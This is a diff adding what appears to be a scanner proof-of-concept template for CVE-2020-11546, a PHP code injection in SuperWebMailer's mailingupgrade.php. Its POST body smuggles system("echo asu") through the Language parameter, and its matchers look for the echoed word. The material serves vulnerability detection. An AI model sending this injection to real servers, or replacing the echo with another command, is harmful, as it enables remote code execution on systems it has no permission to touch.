@@ -1,0 +1,41 @@
+[info]
+author = "ave"
+description = "SuperWebMailer 7.21.0.01526 远程代码执行漏洞，mailingupgrade.php 的 Language 参数存在 PHP 代码注入"
+id = "POC-AVE-2020-0047"
+name = "CVE-2020-11546 PoC"
+severity = "critical"
+tags = [
+    "cve-2020-11546",
+    "superwebmailer",
+    "rce",
+]
+vuln_id = [
+    "CVE-2020-11546",
+    "AVE-2020-0047",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/mailingupgrade.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "step=4&Language=de%7B%24%7Bsystem(%22echo%20asu%22)%7D%7D&RegName=12345678901234567890123&RegNumber=12345&NextBtn=Weiter+%3E"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["asu"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
